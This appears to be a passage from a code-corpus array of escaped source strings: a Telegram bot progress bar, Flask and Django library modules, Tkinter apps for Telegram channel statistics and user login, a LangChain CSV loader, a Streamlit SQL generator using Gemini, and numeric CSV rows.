progress_bar = \"\u25b0\" * completed_length + \"\u25b1\" * remaining_length\r\n            \r\n            try:\r\n                await reply.edit(f'\\n `\u256d\u2500\u2500\u232f\u2550\u2550\u2550\u2550\ud83c\udd84\ufe0e\u1d18\u029f\u1d0f\u1d00\u1d05\u026a\u0274\u0262\u2b06\ufe0f\u2b06\ufe0f\u2550\u2550\u2550\u2550\u2550\u232f\u2500\u2500\u256e \\n\u251c\u26a1 {progress_bar}|\ufe5d{perc}\ufe5e \\n\u251c\ud83d\ude80 Speed \u00bb {sp} \\n\u251c\ud83d\udcdf Processed \u00bb {cur}\\n\u251c\ud83e\uddf2 Size - ETA \u00bb {tot} - {eta} \\n\u251c\ud83e\udd16\ud835\udd39\u028f \u00bb HARSHIT \ud83d\ude0a \\n\u2570\u2500\u2550\u2550\u2550 \u272a HARSHIT \ud83d\ude0a \u272a \u2550\u2550\u2550\u2500\u256f\\n`') \r\n            except FloodWait as e:\r\n                time.sleep(e.x)\r\n\r\n",
    "from __future__ import annotations\n\nimport json as _json\nimport typing as t\n\nfrom ..globals import current_app\nfrom .provider import _default\n\nif t.TYPE_CHECKING:  # pragma: no cover\n    from ..wrappers import Response\n\n\ndef dumps(obj: t.Any, **kwargs: t.Any) -> str:\n    \"\"\"Serialize data as JSON.\n\n    If :data:`~flask.current_app` is available, it will use its\n    :meth:`app.json.dumps() <flask.json.provider.JSONProvider.dumps>`\n    method, otherwise it will use :func:`json.dumps`.\n\n    :param obj: The data to serialize.\n    :param kwargs: Arguments passed to the ``dumps`` implementation.\n\n    .. versionchanged:: 2.3\n        The ``app`` parameter was removed.\n\n    .. versionchanged:: 2.2\n        Calls ``current_app.json.dumps``, allowing an app to override\n        the behavior.\n\n    .. versionchanged:: 2.0.2\n        :class:`decimal.Decimal` is supported by converting to a string.\n\n    .. versionchanged:: 2.0\n        ``encoding`` will be removed in Flask 2.1.\n\n    .. versionchanged:: 1.0.3\n        ``app`` can be passed directly, rather than requiring an app\n        context for configuration.\n    \"\"\"\n    if current_app:\n        return current_app.json.dumps(obj, **kwargs)\n\n    kwargs.setdefault(\"default\", _default)\n    return _json.dumps(obj, **kwargs)\n\n\ndef dump(obj: t.Any, fp: t.IO[str], **kwargs: t.Any) -> None:\n    \"\"\"Serialize data as JSON and write to a file.\n\n    If :data:`~flask.current_app` is available, it will use its\n    :meth:`app.json.dump() <flask.json.provider.JSONProvider.dump>`\n    method, otherwise it will use :func:`json.dump`.\n\n    :param obj: The data to serialize.\n    :param fp: A file opened for writing text. Should use the UTF-8\n        encoding to be valid JSON.\n    :param kwargs: Arguments passed to the ``dump`` implementation.\n\n    .. versionchanged:: 2.3\n        The ``app`` parameter was removed.\n\n    .. versionchanged:: 2.2\n        Calls ``current_app.json.dump``, allowing an app to override\n        the behavior.\n\n    .. versionchanged:: 2.0\n        Writing to a binary file, and the ``encoding`` argument, will be\n        removed in Flask 2.1.\n    \"\"\"\n    if current_app:\n        current_app.json.dump(obj, fp, **kwargs)\n    else:\n        kwargs.setdefault(\"default\", _default)\n        _json.dump(obj, fp, **kwargs)\n\n\ndef loads(s: str | bytes, **kwargs: t.Any) -> t.Any:\n    \"\"\"Deserialize data as JSON.\n\n    If :data:`~flask.current_app` is available, it will use its\n    :meth:`app.json.loads() <flask.json.provider.JSONProvider.loads>`\n    method, otherwise it will use :func:`json.loads`.\n\n    :param s: Text or UTF-8 bytes.\n    :param kwargs: Arguments passed to the ``loads`` implementation.\n\n    .. versionchanged:: 2.3\n        The ``app`` parameter was removed.\n\n    .. versionchanged:: 2.2\n        Calls ``current_app.json.loads``, allowing an app to override\n        the behavior.\n\n    .. versionchanged:: 2.0\n        ``encoding`` will be removed in Flask 2.1. The data must be a\n        string or UTF-8 bytes.\n\n    .. versionchanged:: 1.0.3\n        ``app`` can be passed directly, rather than requiring an app\n        context for configuration.\n    \"\"\"\n    if current_app:\n        return current_app.json.loads(s, **kwargs)\n\n    return _json.loads(s, **kwargs)\n\n\ndef load(fp: t.IO[t.AnyStr], **kwargs: t.Any) -> t.Any:\n    \"\"\"Deserialize data as JSON read from a file.\n\n    If :data:`~flask.current_app` is available, it will use its\n    :meth:`app.json.load() <flask.json.provider.JSONProvider.load>`\n    method, otherwise it will use :func:`json.load`.\n\n    :param fp: A file opened for reading text or UTF-8 bytes.\n    :param kwargs: Arguments passed to the ``load`` implementation.\n\n    .. versionchanged:: 2.3\n        The ``app`` parameter was removed.\n\n    .. versionchanged:: 2.2\n        Calls ``current_app.json.load``, allowing an app to override\n        the behavior.\n\n    .. versionchanged:: 2.2\n        The ``app`` parameter will be removed in Flask 2.3.\n\n    .. versionchanged:: 2.0\n        ``encoding`` will be removed in Flask 2.1. The file must be text\n        mode, or binary mode with UTF-8 bytes.\n    \"\"\"\n    if current_app:\n        return current_app.json.load(fp, **kwargs)\n\n    return _json.load(fp, **kwargs)\n\n\ndef jsonify(*args: t.Any, **kwargs: t.Any) -> Response:\n    \"\"\"Serialize the given arguments as JSON, and return a\n    :class:`~flask.Response` object with the ``application/json``\n    mimetype. A dict or list returned from a view will be converted to a\n    JSON response automatically without needing to call this.\n\n    This requires an active request or application context, and calls\n    :meth:`app.json.response() <flask.json.provider.JSONProvider.response>`.\n\n    In debug mode, the output is formatted with indentation to make it\n    easier to read. This may also be controlled by the provider.\n\n    Either positional or keyword arguments can be given, not both.\n    If no arguments are given, ``None`` is serialized.\n\n    :param args: A single value to serialize, or multiple values t",
    "import tkinter as tk\r\nfrom tkinter import filedialog, ttk, messagebox\r\nfrom telethon import TelegramClient\r\nfrom openpyxl import load_workbook\r\nfrom tkinter import PhotoImage\r\nimport os\r\nfrom openpyxl import Workbook\r\n\r\n\r\ndef filter_func(item, action, channel):\r\n    return item[1] == action and item[2] == channel\r\n\r\n\r\nclass CustomTkinterApp(tk.Tk):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.geometry(\"800x650\")\r\n\r\n        self.api_id = 'YOUR_ID'\r\n        self.api_hash = 'YOUR_HASH'\r\n        self.client = TelegramClient('Auth_data', api_id=self.api_id, api_hash=self.api_hash)\r\n\r\n        self.data_list = None\r\n        self.views_data = {}\r\n        self.forwards_data = {}\r\n\r\n        self.act_label = tk.Label(self, text=\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0430\u043a\u0446\u0438\u0438: \")\r\n        self.act_label.pack()\r\n        self.act_entry = tk.Entry(self)\r\n        self.act_entry.pack(pady=5)\r\n\r\n        self.chanel_label = tk.Label(self, text=\"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043a\u0430\u043d\u0430\u043b: \")\r\n        self.chanel_label.pack()\r\n        self.chanel_combobox = ttk.Combobox(self)\r\n        self.chanel_combobox.pack(pady=5)\r\n\r\n        self.cross_image = PhotoImage(file=\"cross.png\")\r\n        self.check_image = PhotoImage(file=\"check.png\")\r\n        self.frame = tk.Frame(self)\r\n        self.frame.pack(pady=5)\r\n\r\n        self.import_button = tk.Button(self.frame, text=\"Import Excel File\", command=self.import_excel_file)\r\n        self.import_button.pack(side='left')\r\n\r\n        self.import_label = tk.Label(self.frame, image=self.cross_image)\r\n        self.import_label.pack(side='left', padx=5)\r\n\r\n        self.start_button = tk.Button(self, text=\"Start\", command=self.start_main)\r\n        self.start_button.pack(pady=5)\r\n\r\n        self.scrollbar = tk.Scrollbar(self)\r\n        self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)\r\n\r\n        self.output_text = tk.Text(self, yscrollcommand=self.scrollbar.set)\r\n        self.output_text.pack(pady=5, fill=tk.BOTH)\r\n\r\n        self.scrollbar.config(command=self.output_text.yview)\r\n\r\n        self.error_label = tk.Label(self, text=\"\", fg=\"red\")\r\n        self.error_label.pack()\r\n\r\n        self.export_button = tk.Button(self, text=\"Export to Excel\", command=self.export_to_excel)\r\n        self.export_button.pack()\r\n\r\n        with self.client:\r\n            channels = self.client.loop.run_until_complete(self.get_channels())\r\n            self.chanel_combobox['values'] = channels\r\n\r\n    def import_excel_file(self):\r\n        filename = filedialog.askopenfilename(filetypes=[(\"Excel files\", \"*.xlsx\")])\r\n        if filename:\r\n            self.wb = load_workbook(filename)\r\n            self.ws = self.wb['\u041b\u0438\u0441\u04421']\r\n            self.data_list = [(cell1.value, cell2.value, cell3.value) for cell1, cell2, cell3 in\r\n                              zip(self.ws['F'][1:], self.ws['G'][1:], self.ws['E'][1:])]\r\n            self.import_label.config(image=self.check_image)\r\n\r\n    async def get_channels(self):\r\n        dialogs = await self.client.get_dialogs()\r\n        channels = [dialog.title for dialog in dialogs if dialog.is_channel]\r\n        return channels\r\n\r\n    async def main(self, links, chanel):\r\n        views = 0\r\n        forwards = 0\r\n        post_s_video = 0\r\n        post_s_photo = 0\r\n        text_post = 0\r\n        dialogs = await self.client.get_dialogs()\r\n        for dialog in dialogs:\r\n            if dialog.title == chanel:\r\n                messages = await self.client.get_messages(dialog, limit=None)\r\n                self.output_text.insert(tk.END, \"\\n\")\r\n        messages_dict = {str(message.id): message for message in messages}\r\n        for link in links:\r\n            parts = link[0].split('/')\r\n            number = '/'.join(parts[4:])\r\n            if \"https://t.me/\" not in link[0]:\r\n                self.output_text.insert(tk.END, f\"\u0421\u0441\u044b\u043b\u043a\u0430 {link[0]} \u043d\u0435\u0432\u0435\u0440\u043d\u0430\u044f. \u041f\u0440\u043e\u0432\u0435\u0440\u044c\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u0441\u0441\u044b\u043b\u043a\u0438.\\n\")\r\n                self.output_text.insert(tk.END, \"\\n\")\r\n                self.views_data[link[0]] = \"\u0441\u0441\u044b\u043b\u043a\u0430 \u043d\u0435 \u0442\u0435\u043b\u0435\u0433\u0440\u0430\u043c\u043c\"\r\n                self.forwards_data[link[0]] = \"\u0441\u0441\u044b\u043b\u043a\u0430 \u043d\u0435 \u0442\u0435\u043b\u0435\u0433\u0440\u0430\u043c\u043c\"\r\n            else:\r\n                message = messages_dict.get(number)\r\n                if message:\r\n                    view = message.views\r\n                    forward = message.forwards\r\n                    self.views_data[link[0]] = view\r\n                    self.forwards_data[link[0]] = forward\r\n                    consistent = message.message[:50]\r\n                    self.output_text.insert(tk.END, \"\u0421\u0441\u044b\u043b\u043a\u0430 \u043d\u0430 \u043f\u043e\u0441\u0442: \" + link[0] + \"\\n\")\r\n                    self.output_text.insert(tk.END, \"\u041a\u0440\u0430\u0442\u043a\u043e\u0435 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0435 \u043f\u043e\u0441\u0442\u0430: \" + consistent + \"\\n\")\r\n                    self.output_text.insert(tk.END, \"\u0414\u0430\u0442\u0430 \u043f\u0443\u0431\u043b\u0438\u043a\u0430\u0446\u0438\u0438: \" + str(message.date) + \"\\n\")\r\n                    self.output_text.insert(tk.END, \"\u041f\u0440\u043e\u0441\u043c\u043e\u0442\u0440\u044b: \" + str(view) + \"\\n\")\r\n                    self.output_text.insert(tk.END, \"\u0420\u0435\u043f\u043e\u0441\u0442\u044b: \" + str(forward) + \"\\n\")\r\n                    if message.video is not None:\r\n                        self.output_text.insert(tk.END, \"\u0422\u0438\u043f: \u041f\u043e\u0441\u0442 \u0441 \u0432\u0438\u0434\u0435\u043e\\n\")\r\n                        post_s_video",
    "from tkinter import *\nfrom tkinter import messagebox\nimport ttkbootstrap as tb\nimport sqlite3 #conector de base de datos https://pypi.org/project/db-sqlite3/\nimport hashlib #libreria para encrimpar contrase\u00f1a https://pypi.org/project/micropython-hashlib3/\n\n\"\"\"\nhttps://sqlitebrowser.org/ \nDe esta pagina pueden bajar SqLite\n\"\"\"\nclass Ventana(tb.Window): # esta es de ttkbostrap x eso es windows\n    def __init__(self):#m\u00e9todo se llama autom\u00e1ticamente cuando se crea un nuevo objeto de esta clase.\n        super().__init__()#herencia de clases en Python.\n        self.ventana_login()#ventana inicial\n    \n    #---Ventanas que voy a usar---\n    \n    #centra las ventanas\n    def centrar_ventana(self,ventana,ancho,alto):\n        #obtener las dimensiones de la pantalla\n        pantalla_ancho = self.winfo_screenwidth()\n        pantalla_alto = self.winfo_screenheight()\n        \n        #calcular las coordenadas para centrar ventana\n        x = (pantalla_ancho - ancho) // 2\n        y = (pantalla_alto - alto) // 2\n        \n        #establecer las coordenadas de la ventana\n        ventana.geometry(f\"{ancho}x{alto}+{x}+{y}\") \n        #pongo el icono en las ventanas \n        ventana.iconbitmap(\"login.ico\")\n    #ventana de login\n    def ventana_login(self):\n        def ver_clave():\n        # Funci\u00f3n para alternar la visibilidad de la clave\n            if self.ent_clave.cget(\"show\") == \"*\":\n                # Si la clave se est\u00e1 mostrando, ocultarla con asteriscos\n               self.ent_clave.config(show=\"\")\n            else:\n                # Si la clave est\u00e1 oculta con asteriscos, mostrarla como texto normal\n               self.ent_clave.config(show=\"*\")\n        #configuro la columna de la grilla\n        self.grid_columnconfigure(1,weight=1)\n        #armo la pantalla\n        self.frame_login=Frame(master=self)\n        self.frame_login.grid(row=0,column=1,sticky=NSEW)\n        \n        lblframe_login=tb.LabelFrame(master=self.frame_login,text='Acceso')\n        lblframe_login.pack(padx=10,pady=35)\n        \n        #coloco una imagen en este caso la de goku =)\n        imagen = PhotoImage(file=\"Goku.png\")  # Cambia la ruta por la ubicaci\u00f3n de tu imagen\n        imagen = imagen.subsample(3)  # Redimensiona la imagen \n        lbl_imagen = Label(lblframe_login, image=imagen)#lbl de tipo imagen\n        lbl_imagen.image = imagen  # Para evitar que la imagen se elimine por el recolector de basura\n        lbl_imagen.pack()#lo empaqueto\n        \n        lblframe_titulo=tb.Label(master=lblframe_login,text='Goku Sesion',font=('Calibri',18,'bold'))\n        lblframe_titulo.pack(padx=10,pady=35)\n        \n        #campo para ingresar el usuario\n        self.ent_usuario= tb.Entry(master=lblframe_login,width=40,justify=CENTER)\n        self.ent_usuario.pack(padx=10,pady=10)\n        #campo para ingresar la clave\n        self.ent_clave= tb.Entry(master=lblframe_login,width=40,justify=CENTER)\n        self.ent_clave.pack(padx=10,pady=10)\n        self.ent_clave.config(show='*')#para que no se vea la clave\n        self.ent_clave.bind('<Return>', self.logueo_usuarios)#para que luego de la clave funcione el enter\n        #boton para mostrar clave\n        btn_mostrar_clave = tb.Button(master=lblframe_login, text='\ud83d\udc40',bootstyle='light', command=ver_clave)\n        btn_mostrar_clave.pack()\n        #boton de acceso\n        btn_acceso= tb.Button(master=lblframe_login,width=38,text='Ingresar',bootstyle = 'success',command=self.logueo_usuarios)\n        btn_acceso.pack(padx=10,pady=10)\n        #boton para registrarse\n        btn_registrarse= tb.Button(master=lblframe_login,width=38,text='Registrarse',bootstyle = 'info',command=self.ventana_nuevo_usuario)\n        btn_registrarse.pack(padx=10,pady=10)\n        #coloco el focus en el usuario\n        self.ent_usuario.focus()    \n    #ventana de nuevo usuario\n    def ventana_nuevo_usuario(self):\n        def mostrar_clave():\n        # Funci\u00f3n para alternar la visibilidad de la clave\n            if  self.ent_clave_nuevo_usuario.cget(\"show\") == \"*\":\n                # Si la clave se est\u00e1 mostrando, ocultarla con asteriscos\n                self.ent_clave_nuevo_usuario.config(show=\"\")\n            else:\n                # Si la clave est\u00e1 oculta con asteriscos, mostrarla como texto normal\n                self.ent_clave_nuevo_usuario.config(show=\"*\")\n                 \n        #Toplevel pone la ventana por encima del usuario\n        self.frame_nuevo_usuario=Toplevel(master=self)\n        self.frame_nuevo_usuario.title('Nuevo Usuario')\n        self.centrar_ventana(self.frame_nuevo_usuario,550,380)\n        self.frame_nuevo_usuario.grab_set() #es para que no se pueda realizar ninguna accion hasta que no se cierre la ventana\n        \n        #CAMPOS DE NUEVOS DATOS\n        \n        lblframe_nuevo_usuario = tb.LabelFrame(master=self.frame_nuevo_usuario,text='Nuevo Usuario')\n        lblframe_nuevo_usuario.pack(padx=15,pady=35)     \n        #campos de codigo  \n        lbl_codigo_nuevo_usuario = Label(master=lblframe_nuevo_usuario,text='Codi",
    "\"\"\"\nVarious data structures used in query construction.\n\nFactored out from django.db.models.query to avoid making the main module very\nlarge and/or so that they can be used by other modules without getting into\ncircular import difficulties.\n\"\"\"\n\nimport functools\nimport inspect\nimport logging\nfrom collections import namedtuple\n\nfrom django.core.exceptions import FieldError\nfrom django.db import DEFAULT_DB_ALIAS, DatabaseError, connections\nfrom django.db.models.constants import LOOKUP_SEP\nfrom django.utils import tree\nfrom django.utils.functional import cached_property\nfrom django.utils.hashable import make_hashable\n\nlogger = logging.getLogger(\"django.db.models\")\n\n# PathInfo is used when converting lookups (fk__somecol). The contents\n# describe the relation in Model terms (model Options and Fields for both\n# sides of the relation. The join_field is the field backing the relation.\nPathInfo = namedtuple(\n    \"PathInfo\",\n    \"from_opts to_opts target_fields join_field m2m direct filtered_relation\",\n)\n\n\ndef subclasses(cls):\n    yield cls\n    for subclass in cls.__subclasses__():\n        yield from subclasses(subclass)\n\n\nclass Q(tree.Node):\n    \"\"\"\n    Encapsulate filters as objects that can then be combined logically (using\n    `&` and `|`).\n    \"\"\"\n\n    # Connection types\n    AND = \"AND\"\n    OR = \"OR\"\n    XOR = \"XOR\"\n    default = AND\n    conditional = True\n\n    def __init__(self, *args, _connector=None, _negated=False, **kwargs):\n        super().__init__(\n            children=[*args, *sorted(kwargs.items())],\n            connector=_connector,\n            negated=_negated,\n        )\n\n    def _combine(self, other, conn):\n        if getattr(other, \"conditional\", False) is False:\n            raise TypeError(other)\n        if not self:\n            return other.copy()\n        if not other and isinstance(other, Q):\n            return self.copy()\n\n        obj = self.create(connector=conn)\n        obj.add(self, conn)\n        obj.add(other, conn)\n        return obj\n\n    def __or__(self, other):\n        return self._combine(other, self.OR)\n\n    def __and__(self, other):\n        return self._combine(other, self.AND)\n\n    def __xor__(self, other):\n        return self._combine(other, self.XOR)\n\n    def __invert__(self):\n        obj = self.copy()\n        obj.negate()\n        return obj\n\n    def resolve_expression(\n        self, query=None, allow_joins=True, reuse=None, summarize=False, for_save=False\n    ):\n        # We must promote any new joins to left outer joins so that when Q is\n        # used as an expression, rows aren't filtered due to joins.\n        clause, joins = query._add_q(\n            self,\n            reuse,\n            allow_joins=allow_joins,\n            split_subq=False,\n            check_filterable=False,\n            summarize=summarize,\n        )\n        query.promote_joins(joins)\n        return clause\n\n    def flatten(self):\n        \"\"\"\n        Recursively yield this Q object and all subexpressions, in depth-first\n        order.\n        \"\"\"\n        yield self\n        for child in self.children:\n            if isinstance(child, tuple):\n                # Use the lookup.\n                child = child[1]\n            if hasattr(child, \"flatten\"):\n                yield from child.flatten()\n            else:\n                yield child\n\n    def check(self, against, using=DEFAULT_DB_ALIAS):\n        \"\"\"\n        Do a database query to check if the expressions of the Q instance\n        matches against the expressions.\n        \"\"\"\n        # Avoid circular imports.\n        from django.db.models import BooleanField, Value\n        from django.db.models.functions import Coalesce\n        from django.db.models.sql import Query\n        from django.db.models.sql.constants import SINGLE\n\n        query = Query(None)\n        for name, value in against.items():\n            if not hasattr(value, \"resolve_expression\"):\n                value = Value(value)\n            query.add_annotation(value, name, select=False)\n        query.add_annotation(Value(1), \"_check\")\n        # This will raise a FieldError if a field is missing in \"against\".\n        if connections[using].features.supports_comparing_boolean_expr:\n            query.add_q(Q(Coalesce(self, True, output_field=BooleanField())))\n        else:\n            query.add_q(self)\n        compiler = query.get_compiler(using=using)\n        try:\n            return compiler.execute_sql(SINGLE) is not None\n        except DatabaseError as e:\n            logger.warning(\"Got a database error calling check() on %r: %s\", self, e)\n            return True\n\n    def deconstruct(self):\n        path = \"%s.%s\" % (self.__class__.__module__, self.__class__.__name__)\n        if path.startswith(\"django.db.models.query_utils\"):\n            path = path.replace(\"django.db.models.query_utils\", \"django.db.models\")\n        args = tuple(self.children)\n        kwargs = {}\n        if self.connector != self.default:\n            kwargs[\"_connector\"] = self.connector\n        if self.negated:\n            kwargs[\"_neg",
    "import csv\nfrom io import TextIOWrapper\nfrom typing import Any, Dict, List, Optional, Sequence\n\nfrom langchain_core.documents import Document\n\nfrom langchain_community.document_loaders.base import BaseLoader\nfrom langchain_community.document_loaders.helpers import detect_file_encodings\n\n\nclass CSVLoader(BaseLoader):\n    \"\"\"Load a `CSV` file into a list of Documents.\n\n    Each document represents one row of the CSV file. Every row is converted into a\n    key/value pair and outputted to a new line in the document's page_content.\n\n    The source for each document loaded from csv is set to the value of the\n    `file_path` argument for all documents by default.\n    You can override this by setting the `source_column` argument to the\n    name of a column in the CSV file.\n    The source of each document will then be set to the value of the column\n    with the name specified in `source_column`.\n\n    Output Example:\n        .. code-block:: txt\n\n            column1: value1\n            column2: value2\n            column3: value3\n    \"\"\"\n\n    def __init__(\n            self,\n            file_path: str,\n            source_column: Optional[str] = None,\n            metadata_columns: Sequence[str] = (),\n            csv_args: Optional[Dict] = None,\n            encoding: Optional[str] = None,\n            autodetect_encoding: bool = False,\n    ):\n        \"\"\"\n\n        Args:\n            file_path: The path to the CSV file.\n            source_column: The name of the column in the CSV file to use as the source.\n              Optional. Defaults to None.\n            metadata_columns: A sequence of column names to use as metadata. Optional.\n            csv_args: A dictionary of arguments to pass to the csv.DictReader.\n              Optional. Defaults to None.\n            encoding: The encoding of the CSV file. Optional. Defaults to None.\n            autodetect_encoding: Whether to try to autodetect the file encoding.\n        \"\"\"\n        self.file_path = file_path\n        self.source_column = source_column\n        self.metadata_columns = metadata_columns\n        self.encoding = encoding\n        self.csv_args = csv_args or {}\n        self.autodetect_encoding = autodetect_encoding\n\n    def load(self) -> List[Document]:\n        \"\"\"Load data into document objects.\"\"\"\n\n        docs = []\n        try:\n            with open(self.file_path, newline=\"\", encoding=self.encoding) as csvfile:\n                docs = self.__read_file(csvfile)\n        except UnicodeDecodeError as e:\n            if self.autodetect_encoding:\n                detected_encodings = detect_file_encodings(self.file_path)\n                for encoding in detected_encodings:\n                    try:\n                        with open(\n                                self.file_path, newline=\"\", encoding=encoding.encoding\n                        ) as csvfile:\n                            docs = self.__read_file(csvfile)\n                            break\n                    except UnicodeDecodeError:\n                        continue\n            else:\n                raise RuntimeError(f\"Error loading {self.file_path}\") from e\n        except Exception as e:\n            raise RuntimeError(f\"Error loading {self.file_path}\") from e\n\n        return docs\n\n    def __read_file(self, csvfile: TextIOWrapper) -> List[Document]:\n        docs = []\n        csv_reader = csv.DictReader(csvfile, **self.csv_args)  # type: ignore\n        # \u521d\u59cb\u5316\u4e00\u4e2a\u5b57\u5178\uff0c\u7528\u4e8e\u5b58\u50a8\u6bcf\u4e00\u5217\u6700\u540e\u4e00\u6b21\u7684\u975e\u7a7a\u503c\n        last_non_empty_values = {}\n        for i, row in enumerate(csv_reader):\n            try:\n                source = (\n                    row[self.source_column]\n                    if self.source_column is not None\n                    else self.file_path\n                )\n            except KeyError:\n                raise ValueError(\n                    f\"Source column '{self.source_column}' not found in CSV file.\"\n                )\n\n            line_contents = []\n            for k, v in row.items():\n                if k in self.metadata_columns:\n                    continue\n                line_contents.append(f\"{k.strip()}: {v.strip() if v else last_non_empty_values.get(k, v)}\")\n                if v:\n                    last_non_empty_values[k] = v\n            content = '------------------------\\n'\n            # content += \" & \".join(\n            #     f\"{k.strip()}: {v.strip() if v is not None else v}\"\n            #     for k, v in row.items()\n            #     if k not in self.metadata_columns\n            # )\n            content += ' & '.join(line_contents)\n            content += '\\n------------------------'\n\n            metadata = {\"source\": source, \"row\": i}\n            for col in self.metadata_columns:\n                try:\n                    metadata[col] = row[col]\n                except KeyError:\n                    raise ValueError(f\"Metadata column '{col}' not found in CSV file.\")\n            doc = Document(page_content=content, metadata=metadata)\n            docs.append(doc)\n\n        return docs\n",
    "import streamlit as st\nimport google.generativeai as genai\n\nimport os\nfrom dotenv import load_dotenv\nload_dotenv()\n\n#key configure\nkey=os.getenv(\"GOOGLE_API_KEY\")\ngenai.configure(api_key=key)\n\n#model\nmodel=genai.GenerativeModel(model_name=\"gemini-pro\")\n\n\ndef main():\n    st.set_page_config(page_title=\"SQL Query Generator\")\n    st.markdown(\n    \"\"\"\n        <div style=\"text-align:center;\">\n            <h1>SQL query generator</h1>\n            <h3>I can generate sql queried for you</h3>\n            <h4>With explanations as well</h4>\n            <p>This tool is very simple tool that allows you to generate SQL queries based on your prompts.</p>\n\n    \"\"\",\n    unsafe_allow_html=True\n\n    )\n    prompt=st.text_area(\"Enter your prompt here\")\n    submit= st.button(\"Generate SQL query\")\n    if submit:\n        with st.spinner(\"Generating sql query\"):\n\n            templete='''\n\n            Create SQL Query using below condition:\\n\n            ######################################\n\n            {prompt}\n\n            ######################################\n\n            I just want SQL query only\n            \n            '''\n\n            formatted_template=templete.format(prompt=prompt)\n            response=model.generate_content(formatted_template)\n\n            sql_query=response.text.strip().lstrip(\"```sql\").rstrip(\"```\")\n\n            st.write(sql_query)\n\n            expected_output=\"\"\"\n            Can you please provoide the sample expected output for  below query:\n            ###############################################################\n            ```\n            {sql_query}\n\n            ```\n            ###############################################################\n\n            Provoide the results in table format...\n\n            \"\"\"\n\n            expected_template=expected_output.format(sql_query=sql_query)\n            expected_response=model.generate_content(expected_template)\n            expected_result=expected_response.text\n            #st.write(expected_result)\n\n            # Explanation\n            explained_query=\"\"\"\n            Explain the SQL Query:\n            ###############################################################\n            ```\n            {sql_query}\n\n            ```\n            ###############################################################\n\n            \"\"\"\n\n            explained_template=explained_query.format(sql_query=sql_query)\n            explained_response=model.generate_content(explained_template)\n            explained_result=explained_response.text\n            #st.write(explained_result)\n\n            # Results display for every successfull command\n            with st.container():\n                st.success(\"SQL Query generated successfully.Here is code below..\")\n                st.code(sql_query,language='sql')\n                \n                st.success(\"Expected output for the above query is below..\")\n                st.markdown(expected_result)\n\n                st.success(\"Explanation for the above query is below..\")\n                st.markdown(explained_result)\n\n            \nmain()",
    "0.0,50.0\r\n1,373.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,374.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,375.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,376.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,377.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,378.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,379.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,380.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,381.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,382.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,383.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,384.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,385.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,386.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,387.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,388.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,389.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,390.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,391.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,392.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,393.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,394.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,395.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,396.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,397.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,398.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,399.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,400.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,401.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,402.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,403.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,404.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,405.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,406.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,407.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,408.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,409.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,410.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,411.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,412.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,413.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,414.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,415.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,416.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,417.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,418.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,419.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,420.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,421.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,422.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,423.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,424.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,425.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,426.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,427.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,428.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,429.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,430.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,431.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,432.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,433.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,434.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,435.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,436.0,1612535413240,100.0,10.0,40.0,50.0\r\n1,437.0,1612535413240,101.0,10.0,41.0